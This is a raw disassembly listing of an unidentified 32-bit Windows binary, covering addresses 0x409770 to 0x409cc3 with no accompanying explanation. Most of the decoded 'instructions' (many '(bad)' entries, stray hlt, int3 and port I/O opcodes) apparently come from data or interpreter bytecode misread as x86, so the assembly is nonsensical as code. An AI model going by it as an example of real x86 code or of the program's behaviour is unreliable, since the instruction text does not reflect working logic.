  409770:	0c 00                	or     $0x0,%al
	...
  40977a:	00 00                	add    %al,(%eax)
  40977c:	10 00                	adc    %al,(%eax)
  40977e:	00 00                	add    %al,(%eax)
  409780:	00 00                	add    %al,(%eax)
  409782:	01 00                	add    %eax,(%eax)
  409784:	00 00                	add    %al,(%eax)
  409786:	00 00                	add    %al,(%eax)
  409788:	6c                   	insb   (%dx),%es:(%edi)
  409789:	ff 01                	incl   (%ecx)
  40978b:	00 00                	add    %al,(%eax)
  40978d:	02 00                	add    (%eax),%al
  40978f:	05 4b ff ff 00       	add    $0xffff4b,%eax
  409794:	19 1b                	sbb    %ebx,(%ebx)
  409796:	08 00                	or     %al,(%eax)
  409798:	43                   	inc    %ebx
  409799:	6c                   	insb   (%dx),%es:(%edi)
  40979a:	ff 04 6c             	incl   (%esp,%ebp,2)
  40979d:	ff 0b                	decl   (%ebx)
  40979f:	01 00                	add    %eax,(%eax)
  4097a1:	04 00                	add    $0x0,%al
  4097a3:	f4                   	hlt
  4097a4:	00 c6                	add    %al,%dh
  4097a6:	2f                   	das
  4097a7:	6c                   	insb   (%dx),%es:(%edi)
  4097a8:	ff 1c 2a             	lcall  *(%edx,%ebp,1)
  4097ab:	00 00                	add    %al,(%eax)
  4097ad:	07                   	pop    %es
  4097ae:	f4                   	hlt
  4097af:	00 70 7a             	add    %dh,0x7a(%eax)
  4097b2:	ff 00                	incl   (%eax)
  4097b4:	03 15 00 02 00 36    	add    0x36000200,%edx
  4097ba:	04 74                	add    $0x74,%al
  4097bc:	ff f5                	push   %ebp
  4097be:	3f                   	aas
  4097bf:	00 0f                	add    %cl,(%edi)
  4097c1:	00 f5                	add    %dh,%ch
  4097c3:	00 00                	add    %al,(%eax)
  4097c5:	00 00                	add    %al,(%eax)
  4097c7:	80 10 00             	adcb   $0x0,(%eax)
  4097ca:	04 6c                	add    $0x6c,%al
  4097cc:	ff 34 6c             	push   (%esp,%ebp,2)
  4097cf:	6c                   	insb   (%dx),%es:(%edi)
  4097d0:	ff 80 0c 00 5e 02    	incl   0x25e000c(%eax)
  4097d6:	00 14 00             	add    %dl,(%eax,%eax,1)
  4097d9:	71 68                	jno    0x409843
  4097db:	ff                   	(bad)
  4097dc:	3c 6c                	cmp    $0x6c,%al
  4097de:	6c                   	insb   (%dx),%es:(%edi)
  4097df:	ff 6c 10 00          	ljmp   *0x0(%eax,%edx,1)
  4097e3:	fc                   	cld
  4097e4:	58                   	pop    %eax
  4097e5:	6c                   	insb   (%dx),%es:(%edi)
  4097e6:	68 ff 71 70 ff       	push   $0xff7071ff
  4097eb:	2f                   	das
  4097ec:	6c                   	insb   (%dx),%es:(%edi)
  4097ed:	ff 00                	incl   (%eax)
  4097ef:	0e                   	push   %cs
  4097f0:	6c                   	insb   (%dx),%es:(%edi)
  4097f1:	70 ff                	jo     0x4097f2
  4097f3:	f5                   	cmc
  4097f4:	00 00                	add    %al,(%eax)
  4097f6:	00 00                	add    %al,(%eax)
  4097f8:	cc                   	int3
  4097f9:	1c 8e                	sbb    $0x8e,%al
  4097fb:	00 00                	add    %al,(%eax)
  4097fd:	07                   	pop    %es
  4097fe:	f4                   	hlt
  4097ff:	00 70 7a             	add    %dh,0x7a(%eax)
  409802:	ff 00                	incl   (%eax)
  409804:	14 6c                	adc    $0x6c,%al
  409806:	74 ff                	je     0x409807
  409808:	5e                   	pop    %esi
  409809:	03 00                	add    (%eax),%eax
  40980b:	04 00                	add    $0x0,%al
  40980d:	71 68                	jno    0x409877
  40980f:	ff                   	(bad)
  409810:	3c 6c                	cmp    $0x6c,%al
  409812:	68 ff 71 70 ff       	push   $0xff7071ff
  409817:	00 03                	add    %al,(%ebx)
  409819:	15 00 02 00 2e       	adc    $0x2e000200,%eax
  40981e:	f5                   	cmc
  40981f:	08 00                	or     %al,(%eax)
  409821:	00 00                	add    %al,(%eax)
  409823:	80 14 00 04          	adcb   $0x4,(%eax,%eax,1)
  409827:	6c                   	insb   (%dx),%es:(%edi)
  409828:	ff 34 6c             	push   (%esp,%ebp,2)
  40982b:	6c                   	insb   (%dx),%es:(%edi)
  40982c:	ff 6c 74 ff          	ljmp   *-0x1(%esp,%esi,2)
  409830:	5e                   	pop    %esi
  409831:	09 00                	or     %eax,(%eax)
  409833:	0c 00                	or     $0x0,%al
  409835:	71 68                	jno    0x40989f
  409837:	ff                   	(bad)
  409838:	3c 6c                	cmp    $0x6c,%al
  40983a:	6c                   	insb   (%dx),%es:(%edi)
  40983b:	ff 6c 14 00          	ljmp   *0x0(%esp,%edx,1)
  40983f:	fc                   	cld
  409840:	58                   	pop    %eax
  409841:	6c                   	insb   (%dx),%es:(%edi)
  409842:	68 ff 71 70 ff       	push   $0xff7071ff
  409847:	2f                   	das
  409848:	6c                   	insb   (%dx),%es:(%edi)
  409849:	ff 00                	incl   (%eax)
  40984b:	0e                   	push   %cs
  40984c:	6c                   	insb   (%dx),%es:(%edi)
  40984d:	70 ff                	jo     0x40984e
  40984f:	f5                   	cmc
  409850:	00 00                	add    %al,(%eax)
  409852:	00 00                	add    %al,(%eax)
  409854:	c7                   	(bad)
  409855:	1c d6                	sbb    $0xd6,%al
  409857:	00 00                	add    %al,(%eax)
  409859:	07                   	pop    %es
  40985a:	f4                   	hlt
  40985b:	ff 70 7a             	push   0x7a(%eax)
  40985e:	ff 1e                	lcall  *(%esi)
  409860:	df 00                	filds  (%eax)
  409862:	00 02                	add    %al,(%edx)
  409864:	00 07                	add    %al,(%edi)
  409866:	f4                   	hlt
  409867:	00 70 7a             	add    %dh,0x7a(%eax)
  40986a:	ff 00                	incl   (%eax)
  40986c:	02 00                	add    (%eax),%al
  40986e:	14 6c                	adc    $0x6c,%al
  409870:	74 ff                	je     0x409871
  409872:	5e                   	pop    %esi
  409873:	03 00                	add    (%eax),%eax
  409875:	04 00                	add    $0x0,%al
  409877:	71 68                	jno    0x4098e1
  409879:	ff                   	(bad)
  40987a:	3c 6c                	cmp    $0x6c,%al
  40987c:	68 ff 71 70 ff       	push   $0xff7071ff
  409881:	00 00                	add    %al,(%eax)
  409883:	15 8c 71 40 00       	adc    $0x40718c,%eax
  409888:	10 00                	adc    %al,(%eax)
  40988a:	14 00                	adc    $0x0,%al
  40988c:	f8                   	clc
  40988d:	00 24 00             	add    %ah,(%eax,%eax,1)
  409890:	00 00                	add    %al,(%eax)
  409892:	00 00                	add    %al,(%eax)
  409894:	00 00                	add    %al,(%eax)
  409896:	13 00                	adc    (%eax),%eax
  409898:	00 00                	add    %al,(%eax)
  40989a:	00 00                	add    %al,(%eax)
  40989c:	0c 00                	or     $0x0,%al
	...
  4098a6:	00 00                	add    %al,(%eax)
  4098a8:	10 00                	adc    %al,(%eax)
  4098aa:	00 00                	add    %al,(%eax)
  4098ac:	00 00                	add    %al,(%eax)
  4098ae:	01 00                	add    %eax,(%eax)
  4098b0:	00 00                	add    %al,(%eax)
  4098b2:	00 00                	add    %al,(%eax)
  4098b4:	6c                   	insb   (%dx),%es:(%edi)
  4098b5:	ff 01                	incl   (%ecx)
  4098b7:	00 00                	add    %al,(%eax)
  4098b9:	02 00                	add    (%eax),%al
  4098bb:	05 4b ff ff 00       	add    $0xffff4b,%eax
  4098c0:	25 5e 19 00 00       	and    $0x195e,%eax
  4098c5:	00 71 40             	add    %dh,0x40(%ecx)
  4098c8:	ff                   	(bad)
  4098c9:	3c 04                	cmp    $0x4,%al
  4098cb:	70 ff                	jo     0x4098cc
  4098cd:	f5                   	cmc
  4098ce:	28 00                	sub    %al,(%eax)
  4098d0:	00 00                	add    %al,(%eax)
  4098d2:	6c                   	insb   (%dx),%es:(%edi)
  4098d3:	40                   	inc    %eax
  4098d4:	ff 5e 1a             	lcall  *0x1a(%esi)
  4098d7:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4098da:	71 3c                	jno    0x409918
  4098dc:	ff                   	(bad)
  4098dd:	3c 6c                	cmp    $0x6c,%al
  4098df:	3c ff                	cmp    $0xff,%al
  4098e1:	71 74                	jno    0x409957
  4098e3:	ff 00                	incl   (%eax)
  4098e5:	0e                   	push   %cs
  4098e6:	6c                   	insb   (%dx),%es:(%edi)
  4098e7:	74 ff                	je     0x4098e8
  4098e9:	f5                   	cmc
  4098ea:	00 00                	add    %al,(%eax)
  4098ec:	00 00                	add    %al,(%eax)
  4098ee:	c7                   	(bad)
  4098ef:	1c 44                	sbb    $0x44,%al
  4098f1:	00 00                	add    %al,(%eax)
  4098f3:	07                   	pop    %es
  4098f4:	f4                   	hlt
  4098f5:	00 70 7a             	add    %dh,0x7a(%eax)
  4098f8:	ff 00                	incl   (%eax)
  4098fa:	03 15 00 02 00 24    	add    0x24000200,%edx
  409900:	04 40                	add    $0x40,%al
  409902:	ff 0b                	decl   (%ebx)
  409904:	1b 00                	sbb    (%eax),%eax
  409906:	00 00                	add    %al,(%eax)
  409908:	19 38                	sbb    %edi,(%eax)
  40990a:	ff 08                	decl   (%eax)
  40990c:	38 ff                	cmp    %bh,%bh
  40990e:	0d 4c 00 1c 00       	or     $0x1c004c,%eax
  409913:	6c                   	insb   (%dx),%es:(%edi)
  409914:	40                   	inc    %eax
  409915:	ff f5                	push   %ebp
  409917:	00 00                	add    %al,(%eax)
  409919:	00 00                	add    %al,(%eax)
  40991b:	cc                   	int3
  40991c:	1a 38                	sbb    (%eax),%bh
  40991e:	ff 1c 74             	lcall  *(%esp,%esi,2)
  409921:	00 00                	add    %al,(%eax)
  409923:	07                   	pop    %es
  409924:	f4                   	hlt
  409925:	00 70 7a             	add    %dh,0x7a(%eax)
  409928:	ff 00                	incl   (%eax)
  40992a:	03 15 00 02 00 2e    	add    0x2e000200,%edx
  409930:	04 64                	add    $0x64,%al
  409932:	ff 80 0c 00 04 34    	incl   0x3404000c(%eax)
  409938:	ff 34 6c             	push   (%esp,%ebp,2)
  40993b:	34 ff                	xor    $0xff,%al
  40993d:	f5                   	cmc
  40993e:	00 00                	add    %al,(%eax)
  409940:	00 00                	add    %al,(%eax)
  409942:	5e                   	pop    %esi
  409943:	1d 00 0c 00 71       	sbb    $0x71000c00,%eax
  409948:	40                   	inc    %eax
  409949:	ff                   	(bad)
  40994a:	3c 6c                	cmp    $0x6c,%al
  40994c:	34 ff                	xor    $0xff,%al
  40994e:	6c                   	insb   (%dx),%es:(%edi)
  40994f:	0c 00                	or     $0x0,%al
  409951:	fc                   	cld
  409952:	58                   	pop    %eax
  409953:	6c                   	insb   (%dx),%es:(%edi)
  409954:	40                   	inc    %eax
  409955:	ff 71 74             	push   0x74(%ecx)
  409958:	ff 2f                	ljmp   *(%edi)
  40995a:	34 ff                	xor    $0xff,%al
  40995c:	00 0e                	add    %cl,(%esi)
  40995e:	6c                   	insb   (%dx),%es:(%edi)
  40995f:	74 ff                	je     0x409960
  409961:	f5                   	cmc
  409962:	00 00                	add    %al,(%eax)
  409964:	00 00                	add    %al,(%eax)
  409966:	c7                   	(bad)
  409967:	1c bc                	sbb    $0xbc,%al
  409969:	00 00                	add    %al,(%eax)
  40996b:	07                   	pop    %es
  40996c:	f4                   	hlt
  40996d:	00 70 7a             	add    %dh,0x7a(%eax)
  409970:	ff 00                	incl   (%eax)
  409972:	03 15 00 02 00 0a    	add    0xa000200,%edx
  409978:	f5                   	cmc
  409979:	01 00                	add    %eax,(%eax)
  40997b:	00 00                	add    %al,(%eax)
  40997d:	71 54                	jno    0x4099d3
  40997f:	ff 00                	incl   (%eax)
  409981:	0a f5                	or     %ch,%dh
  409983:	02 00                	add    (%eax),%al
  409985:	00 00                	add    %al,(%eax)
  409987:	71 60                	jno    0x4099e9
  409989:	ff 00                	incl   (%eax)
  40998b:	0b 04 64             	or     (%esp,%eiz,2),%eax
  40998e:	ff 04 58             	incl   (%eax,%ebx,2)
  409991:	ff                   	(bad)
  409992:	38 08                	cmp    %cl,(%eax)
  409994:	00 00                	add    %al,(%eax)
  409996:	2b 04 6c             	sub    (%esp,%ebp,2),%eax
  409999:	ff 04 44             	incl   (%esp,%eax,2)
  40999c:	ff f5                	push   %ebp
  40999e:	10 00                	adc    %al,(%eax)
  4099a0:	00 00                	add    %al,(%eax)
  4099a2:	04 54                	add    $0x54,%al
  4099a4:	ff f4                	push   %esp
  4099a6:	00 e7                	add    %ah,%bh
  4099a8:	6c                   	insb   (%dx),%es:(%edi)
  4099a9:	70 ff                	jo     0x4099aa
  4099ab:	5e                   	pop    %esi
  4099ac:	1e                   	push   %ds
  4099ad:	00 18                	add    %bl,(%eax)
  4099af:	00 71 40             	add    %dh,0x40(%ecx)
  4099b2:	ff                   	(bad)
  4099b3:	3c 6c                	cmp    $0x6c,%al
  4099b5:	40                   	inc    %eax
  4099b6:	ff f5                	push   %ebp
  4099b8:	00 00                	add    %al,(%eax)
  4099ba:	00 00                	add    %al,(%eax)
  4099bc:	cc                   	int3
  4099bd:	70 7a                	jo     0x409a39
  4099bf:	ff 00                	incl   (%eax)
  4099c1:	00 15 00 8c 71 40    	add    %dl,0x40718c00
  4099c7:	00 08                	add    %cl,(%eax)
  4099c9:	00 48 00             	add    %cl,0x0(%eax)
  4099cc:	0c 01                	or     $0x1,%al
  4099ce:	24 00                	and    $0x0,%al
  4099d0:	00 00                	add    %al,(%eax)
  4099d2:	00 00                	add    %al,(%eax)
  4099d4:	00 00                	add    %al,(%eax)
  4099d6:	13 00                	adc    (%eax),%eax
  4099d8:	00 00                	add    %al,(%eax)
  4099da:	00 00                	add    %al,(%eax)
  4099dc:	0c 00                	or     $0x0,%al
	...
  4099e6:	00 00                	add    %al,(%eax)
  4099e8:	14 00                	adc    $0x0,%al
  4099ea:	00 00                	add    %al,(%eax)
  4099ec:	00 00                	add    %al,(%eax)
  4099ee:	02 00                	add    (%eax),%al
  4099f0:	00 00                	add    %al,(%eax)
  4099f2:	00 00                	add    %al,(%eax)
  4099f4:	34 ff                	xor    $0xff,%al
  4099f6:	01 00                	add    %eax,(%eax)
  4099f8:	38 ff                	cmp    %bh,%bh
  4099fa:	03 00                	add    (%eax),%eax
  4099fc:	00 02                	add    %al,(%edx)
  4099fe:	00 05 4b ff ff 00    	add    %al,0xffff4b
  409a04:	19 1b                	sbb    %ebx,(%ebx)
  409a06:	00 00                	add    %al,(%eax)
  409a08:	43                   	inc    %ebx
  409a09:	6c                   	insb   (%dx),%es:(%edi)
  409a0a:	ff 04 6c             	incl   (%esp,%ebp,2)
  409a0d:	ff 0b                	decl   (%ebx)
  409a0f:	01 00                	add    %eax,(%eax)
  409a11:	04 00                	add    $0x0,%al
  409a13:	f4                   	hlt
  409a14:	00 c6                	add    %al,%dh
  409a16:	2f                   	das
  409a17:	6c                   	insb   (%dx),%es:(%edi)
  409a18:	ff 1c 2a             	lcall  *(%edx,%ebp,1)
  409a1b:	00 00                	add    %al,(%eax)
  409a1d:	07                   	pop    %es
  409a1e:	f4                   	hlt
  409a1f:	00 70 7a             	add    %dh,0x7a(%eax)
  409a22:	ff 00                	incl   (%eax)
  409a24:	03 15 00 02 00 36    	add    0x36000200,%edx
  409a2a:	04 74                	add    $0x74,%al
  409a2c:	ff f5                	push   %ebp
  409a2e:	3f                   	aas
  409a2f:	00 0f                	add    %cl,(%edi)
  409a31:	00 f5                	add    %dh,%ch
  409a33:	00 00                	add    %al,(%eax)
  409a35:	00 00                	add    %al,(%eax)
  409a37:	80 10 00             	adcb   $0x0,(%eax)
  409a3a:	04 6c                	add    $0x6c,%al
  409a3c:	ff 34 6c             	push   (%esp,%ebp,2)
  409a3f:	6c                   	insb   (%dx),%es:(%edi)
  409a40:	ff 80 0c 00 5e 02    	incl   0x25e000c(%eax)
  409a46:	00 14 00             	add    %dl,(%eax,%eax,1)
  409a49:	71 68                	jno    0x409ab3
  409a4b:	ff                   	(bad)
  409a4c:	3c 6c                	cmp    $0x6c,%al
  409a4e:	6c                   	insb   (%dx),%es:(%edi)
  409a4f:	ff 6c 10 00          	ljmp   *0x0(%eax,%edx,1)
  409a53:	fc                   	cld
  409a54:	58                   	pop    %eax
  409a55:	6c                   	insb   (%dx),%es:(%edi)
  409a56:	68 ff 71 70 ff       	push   $0xff7071ff
  409a5b:	2f                   	das
  409a5c:	6c                   	insb   (%dx),%es:(%edi)
  409a5d:	ff 00                	incl   (%eax)
  409a5f:	0e                   	push   %cs
  409a60:	6c                   	insb   (%dx),%es:(%edi)
  409a61:	70 ff                	jo     0x409a62
  409a63:	f5                   	cmc
  409a64:	00 00                	add    %al,(%eax)
  409a66:	00 00                	add    %al,(%eax)
  409a68:	cc                   	int3
  409a69:	1c 8e                	sbb    $0x8e,%al
  409a6b:	00 00                	add    %al,(%eax)
  409a6d:	07                   	pop    %es
  409a6e:	f4                   	hlt
  409a6f:	00 70 7a             	add    %dh,0x7a(%eax)
  409a72:	ff 00                	incl   (%eax)
  409a74:	14 6c                	adc    $0x6c,%al
  409a76:	74 ff                	je     0x409a77
  409a78:	5e                   	pop    %esi
  409a79:	03 00                	add    (%eax),%eax
  409a7b:	04 00                	add    $0x0,%al
  409a7d:	71 68                	jno    0x409ae7
  409a7f:	ff                   	(bad)
  409a80:	3c 6c                	cmp    $0x6c,%al
  409a82:	68 ff 71 70 ff       	push   $0xff7071ff
  409a87:	00 03                	add    %al,(%ebx)
  409a89:	15 00 02 00 22       	adc    $0x22000200,%eax
  409a8e:	f5                   	cmc
  409a8f:	00 00                	add    %al,(%eax)
  409a91:	00 00                	add    %al,(%eax)
  409a93:	6c                   	insb   (%dx),%es:(%edi)
  409a94:	14 00                	adc    $0x0,%al
  409a96:	4d                   	dec    %ebp
  409a97:	58                   	pop    %eax
  409a98:	ff 08                	decl   (%eax)
  409a9a:	40                   	inc    %eax
  409a9b:	0b 04 00             	or     (%eax,%eax,1),%eax
  409a9e:	08 00                	or     %al,(%eax)
  409aa0:	23 6c ff 1b          	and    0x1b(%edi,%edi,8),%ebp
  409aa4:	05 00 fb 3d 2f       	add    $0x2f3dfb00,%eax
  409aa9:	6c                   	insb   (%dx),%es:(%edi)
  409aaa:	ff 1c c1             	lcall  *(%ecx,%eax,8)
  409aad:	00 00                	add    %al,(%eax)
  409aaf:	0f 6c                	(bad)
  409ab1:	14 00                	adc    $0x0,%al
  409ab3:	4d                   	dec    %ebp
  409ab4:	58                   	pop    %eax
  409ab5:	ff 08                	decl   (%eax)
  409ab7:	40                   	inc    %eax
  409ab8:	0a 06                	or     (%esi),%al
  409aba:	00 04 00             	add    %al,(%eax,%eax,1)
  409abd:	00 2e                	add    %ch,(%esi)
  409abf:	f5                   	cmc
  409ac0:	00 00                	add    %al,(%eax)
  409ac2:	00 00                	add    %al,(%eax)
  409ac4:	80 14 00 04          	adcb   $0x4,(%eax,%eax,1)
  409ac8:	6c                   	insb   (%dx),%es:(%edi)
  409ac9:	ff 34 6c             	push   (%esp,%ebp,2)
  409acc:	6c                   	insb   (%dx),%es:(%edi)
  409acd:	ff 6c 74 ff          	ljmp   *-0x1(%esp,%esi,2)
  409ad1:	5e                   	pop    %esi
  409ad2:	07                   	pop    %es
  409ad3:	00 0c 00             	add    %cl,(%eax,%eax,1)
  409ad6:	71 68                	jno    0x409b40
  409ad8:	ff                   	(bad)
  409ad9:	3c 6c                	cmp    $0x6c,%al
  409adb:	6c                   	insb   (%dx),%es:(%edi)
  409adc:	ff 6c 14 00          	ljmp   *0x0(%esp,%edx,1)
  409ae0:	fc                   	cld
  409ae1:	58                   	pop    %eax
  409ae2:	6c                   	insb   (%dx),%es:(%edi)
  409ae3:	68 ff 71 70 ff       	push   $0xff7071ff
  409ae8:	2f                   	das
  409ae9:	6c                   	insb   (%dx),%es:(%edi)
  409aea:	ff 00                	incl   (%eax)
  409aec:	0e                   	push   %cs
  409aed:	6c                   	insb   (%dx),%es:(%edi)
  409aee:	70 ff                	jo     0x409aef
  409af0:	f5                   	cmc
  409af1:	00 00                	add    %al,(%eax)
  409af3:	00 00                	add    %al,(%eax)
  409af5:	c7                   	(bad)
  409af6:	1c 07                	sbb    $0x7,%al
  409af8:	01 00                	add    %eax,(%eax)
  409afa:	07                   	pop    %es
  409afb:	f4                   	hlt
  409afc:	ff 70 7a             	push   0x7a(%eax)
  409aff:	ff 1e                	lcall  *(%esi)
  409b01:	10 01                	adc    %al,(%ecx)
  409b03:	00 02                	add    %al,(%edx)
  409b05:	00 07                	add    %al,(%edi)
  409b07:	f4                   	hlt
  409b08:	00 70 7a             	add    %dh,0x7a(%eax)
  409b0b:	ff 00                	incl   (%eax)
  409b0d:	02 00                	add    (%eax),%al
  409b0f:	14 6c                	adc    $0x6c,%al
  409b11:	74 ff                	je     0x409b12
  409b13:	5e                   	pop    %esi
  409b14:	03 00                	add    (%eax),%eax
  409b16:	04 00                	add    $0x0,%al
  409b18:	71 68                	jno    0x409b82
  409b1a:	ff                   	(bad)
  409b1b:	3c 6c                	cmp    $0x6c,%al
  409b1d:	68 ff 71 70 ff       	push   $0xff7071ff
  409b22:	00 00                	add    %al,(%eax)
  409b24:	15 00 00 00 8c       	adc    $0x8c000000,%eax
  409b29:	71 40                	jno    0x409b6b
  409b2b:	00 10                	add    %dl,(%eax)
  409b2d:	00 24 00             	add    %ah,(%eax,%eax,1)
  409b30:	2c 01                	sub    $0x1,%al
  409b32:	24 00                	and    $0x0,%al
  409b34:	00 00                	add    %al,(%eax)
  409b36:	00 00                	add    %al,(%eax)
  409b38:	00 00                	add    %al,(%eax)
  409b3a:	13 00                	adc    (%eax),%eax
  409b3c:	00 00                	add    %al,(%eax)
  409b3e:	00 00                	add    %al,(%eax)
  409b40:	0c 00                	or     $0x0,%al
	...
  409b4a:	00 00                	add    %al,(%eax)
  409b4c:	10 00                	adc    %al,(%eax)
  409b4e:	00 00                	add    %al,(%eax)
  409b50:	00 00                	add    %al,(%eax)
  409b52:	01 00                	add    %eax,(%eax)
  409b54:	00 00                	add    %al,(%eax)
  409b56:	00 00                	add    %al,(%eax)
  409b58:	6c                   	insb   (%dx),%es:(%edi)
  409b59:	ff 01                	incl   (%ecx)
  409b5b:	00 3a                	add    %bh,(%edx)
  409b5d:	24 ff                	and    $0xff,%al
  409b5f:	00 00                	add    %al,(%eax)
  409b61:	fd                   	std
  409b62:	00 58 ff             	add    %bl,-0x1(%eax)
  409b65:	3a 24 ff             	cmp    (%edi,%edi,8),%ah
  409b68:	01 00                	add    %eax,(%eax)
  409b6a:	fd                   	std
  409b6b:	00 48 ff             	add    %cl,-0x1(%eax)
  409b6e:	3a 24 ff             	cmp    (%edi,%edi,8),%ah
  409b71:	02 00                	add    (%eax),%al
  409b73:	fd                   	std
  409b74:	00 38                	add    %bh,(%eax)
  409b76:	ff 1b                	lcall  *(%ebx)
  409b78:	03 00                	add    (%eax),%eax
  409b7a:	43                   	inc    %ebx
  409b7b:	34 ff                	xor    $0xff,%al
  409b7d:	f4                   	hlt
  409b7e:	00 70 7a             	add    %dh,0x7a(%eax)
  409b81:	ff f5                	push   %ebp
  409b83:	00 00                	add    %al,(%eax)
  409b85:	00 00                	add    %al,(%eax)
  409b87:	80 0c 00 46          	orb    $0x46,(%eax,%eax,1)
  409b8b:	24 ff                	and    $0xff,%al
  409b8d:	04 58                	add    $0x58,%al
  409b8f:	ff                   	(bad)
  409b90:	fb                   	sti
  409b91:	94                   	xchg   %eax,%esp
  409b92:	14 ff                	adc    $0xff,%al
  409b94:	3a 04 ff             	cmp    (%edi,%edi,8),%al
  409b97:	04 00                	add    $0x0,%al
  409b99:	fb                   	sti
  409b9a:	94                   	xchg   %eax,%esp
  409b9b:	f4                   	hlt
  409b9c:	fe 0b                	decb   (%ebx)
  409b9e:	05 00 08 00 23       	add    $0x23000800,%eax
  409ba3:	f0 fe                	lock (bad)
  409ba5:	1b 06                	sbb    (%esi),%eax
  409ba7:	00 fb                	add    %bh,%bl
  409ba9:	3d 2f f0 fe 36       	cmp    $0x36fef02f,%eax
  409bae:	04 00                	add    $0x0,%al
  409bb0:	14 ff                	adc    $0xff,%al
  409bb2:	f4                   	hlt
  409bb3:	fe                   	(bad)
  409bb4:	1c 60                	sbb    $0x60,%al
  409bb6:	00 f4                	add    %dh,%ah
  409bb8:	ff 70 7a             	push   0x7a(%eax)
  409bbb:	ff f5                	push   %ebp
  409bbd:	00 00                	add    %al,(%eax)
  409bbf:	00 00                	add    %al,(%eax)
  409bc1:	80 0c 00 46          	orb    $0x46,(%eax,%eax,1)
  409bc5:	24 ff                	and    $0xff,%al
  409bc7:	04 48                	add    $0x48,%al
  409bc9:	ff                   	(bad)
  409bca:	fb                   	sti
  409bcb:	94                   	xchg   %eax,%esp
  409bcc:	14 ff                	adc    $0xff,%al
  409bce:	3a 04 ff             	cmp    (%edi,%edi,8),%al
  409bd1:	04 00                	add    $0x0,%al
  409bd3:	fb                   	sti
  409bd4:	94                   	xchg   %eax,%esp
  409bd5:	f4                   	hlt
  409bd6:	fe 0b                	decb   (%ebx)
  409bd8:	05 00 08 00 23       	add    $0x23000800,%eax
  409bdd:	f0 fe                	lock (bad)
  409bdf:	1b 06                	sbb    (%esi),%eax
  409be1:	00 fb                	add    %bh,%bl
  409be3:	3d 2f f0 fe 36       	cmp    $0x36fef02f,%eax
  409be8:	04 00                	add    $0x0,%al
  409bea:	14 ff                	adc    $0xff,%al
  409bec:	f4                   	hlt
  409bed:	fe                   	(bad)
  409bee:	1c 9a                	sbb    $0x9a,%al
  409bf0:	00 f4                	add    %dh,%ah
  409bf2:	ff 70 7a             	push   0x7a(%eax)
  409bf5:	ff f5                	push   %ebp
  409bf7:	00 00                	add    %al,(%eax)
  409bf9:	00 00                	add    %al,(%eax)
  409bfb:	80 0c 00 46          	orb    $0x46,(%eax,%eax,1)
  409bff:	24 ff                	and    $0xff,%al
  409c01:	04 38                	add    $0x38,%al
  409c03:	ff                   	(bad)
  409c04:	fb                   	sti
  409c05:	94                   	xchg   %eax,%esp
  409c06:	14 ff                	adc    $0xff,%al
  409c08:	3a 04 ff             	cmp    (%edi,%edi,8),%al
  409c0b:	04 00                	add    $0x0,%al
  409c0d:	fb                   	sti
  409c0e:	94                   	xchg   %eax,%esp
  409c0f:	f4                   	hlt
  409c10:	fe 0b                	decb   (%ebx)
  409c12:	05 00 08 00 23       	add    $0x23000800,%eax
  409c17:	f0 fe                	lock (bad)
  409c19:	1b 06                	sbb    (%esi),%eax
  409c1b:	00 fb                	add    %bh,%bl
  409c1d:	3d 2f f0 fe 36       	cmp    $0x36fef02f,%eax
  409c22:	04 00                	add    $0x0,%al
  409c24:	14 ff                	adc    $0xff,%al
  409c26:	f4                   	hlt
  409c27:	fe                   	(bad)
  409c28:	1c d4                	sbb    $0xd4,%al
  409c2a:	00 f4                	add    %dh,%ah
  409c2c:	ff 70 7a             	push   0x7a(%eax)
  409c2f:	ff f5                	push   %ebp
  409c31:	00 00                	add    %al,(%eax)
  409c33:	00 00                	add    %al,(%eax)
  409c35:	80 0c 00 6c          	orb    $0x6c,(%eax,%eax,1)
  409c39:	34 ff                	xor    $0xff,%al
  409c3b:	2a 23                	sub    (%ebx),%ah
  409c3d:	f0 fe                	lock (bad)
  409c3f:	1b 04 00             	sbb    (%eax,%eax,1),%eax
  409c42:	2a 46 14             	sub    0x14(%esi),%al
  409c45:	ff 0b                	decl   (%ebx)
  409c47:	05 00 08 00 23       	add    $0x23000800,%eax
  409c4c:	ec                   	in     (%dx),%al
  409c4d:	fe                   	(bad)
  409c4e:	1b 06                	sbb    (%esi),%eax
  409c50:	00 fb                	add    %bh,%bl
  409c52:	3d 32 04 00 f0       	cmp    $0xf0000432,%eax
  409c57:	fe                   	(bad)
  409c58:	ec                   	in     (%dx),%al
  409c59:	fe                   	(bad)
  409c5a:	35 14 ff 1c 09       	xor    $0x91cff14,%eax
  409c5f:	01 f4                	add    %esi,%esp
  409c61:	ff 70 7a             	push   0x7a(%eax)
  409c64:	ff 15 00 00 cc 6b    	call   *0x6bcc0000
  409c6a:	40                   	inc    %eax
  409c6b:	00 08                	add    %cl,(%eax)
  409c6d:	00 90 00 0c 01 38    	add    %dl,0x38010c00(%eax)
  409c73:	00 00                	add    %al,(%eax)
  409c75:	00 00                	add    %al,(%eax)
  409c77:	00 00                	add    %al,(%eax)
  409c79:	00 13                	add    %dl,(%ebx)
  409c7b:	00 00                	add    %al,(%eax)
  409c7d:	00 00                	add    %al,(%eax)
  409c7f:	00 20                	add    %ah,(%eax)
  409c81:	00 00                	add    %al,(%eax)
  409c83:	00 00                	add    %al,(%eax)
  409c85:	00 05 00 00 00 00    	add    %al,0x0
  409c8b:	00 58 ff             	add    %bl,-0x1(%eax)
  409c8e:	02 00                	add    (%eax),%al
  409c90:	48                   	dec    %eax
  409c91:	ff 02                	incl   (%edx)
  409c93:	00 68 ff             	add    %ch,-0x1(%eax)
  409c96:	02 00                	add    (%eax),%al
  409c98:	38 ff                	cmp    %bh,%bh
  409c9a:	02 00                	add    (%eax),%al
  409c9c:	34 ff                	xor    $0xff,%al
  409c9e:	01 00                	add    %eax,(%eax)
  409ca0:	1c 00                	sbb    $0x0,%al
  409ca2:	00 00                	add    %al,(%eax)
  409ca4:	00 00                	add    %al,(%eax)
  409ca6:	04 00                	add    $0x0,%al
  409ca8:	00 00                	add    %al,(%eax)
  409caa:	00 00                	add    %al,(%eax)
  409cac:	f0 fe 01             	lock incb (%ecx)
  409caf:	00 ec                	add    %ch,%ah
  409cb1:	fe 01                	incb   (%ecx)
  409cb3:	00 14 ff             	add    %dl,(%edi,%edi,8)
  409cb6:	02 00                	add    (%eax),%al
  409cb8:	f4                   	hlt
  409cb9:	fe 02                	incb   (%edx)
  409cbb:	00 00                	add    %al,(%eax)
  409cbd:	02 00                	add    (%eax),%al
  409cbf:	02 00                	add    (%eax),%al
  409cc1:	0a 0b                	or     (%ebx),%cl
  409cc3:	00 00                	add    %al,(%eax)
